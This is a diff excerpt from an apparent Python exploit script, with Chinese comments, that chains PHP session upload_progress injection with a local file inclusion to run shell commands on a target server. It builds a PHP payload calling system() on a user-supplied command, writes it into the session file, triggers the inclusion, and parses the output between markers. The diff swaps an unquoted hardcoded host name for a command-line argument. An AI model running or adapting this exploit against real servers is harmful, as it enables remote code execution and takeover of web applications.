@@ -124,14 +124,14 @@ def main():
     cmd = args.command.replace("'", "'\"'\"'")
     php_code = "<?php echo '___START___'; system('%s'); echo '___END___';?>" % cmd
 
-    print("[*] Target      : %s:%d" % (target473.example.com, args.port))
+    print("[*] Target      : %s:%d" % (args.host, args.port))
     print("[*] SID         : %s" % sid)
     print("[*] Session file: %s" % session_file)
     print("[*] Command     : %s" % args.command)
     print()
 
     print("[1] 通过 upload_progress 注入 PHP 代码到会话文件...")
-    resp1 = inject_session(target473.example.com, args.port, args.inject_path, sid, php_code)
+    resp1 = inject_session(args.host, args.port, args.inject_path, sid, php_code)
     status1 = resp1.split(b"\r\n", 1)[0].decode("latin1", "replace") if resp1 else "NO RESPONSE"
     print("    Status: %s" % status1)
 
@@ -140,7 +140,7 @@ def main():
     lfi_path = args.lfi_path
     if args.lfi_param != "page":
         lfi_path = lfi_path  # 参数名由 trigger_lfi 固定为 page, 如需自定义见下方
-    resp2 = trigger_lfi(target473.example.com, args.port, lfi_path, session_file, sid)
+    resp2 = trigger_lfi(args.host, args.port, lfi_path, session_file, sid)
     body = resp2.split(b"\r\n\r\n", 1)[-1] if b"\r\n\r\n" in resp2 else resp2
 
     if b"___START___" in body and b"___END___" in body:
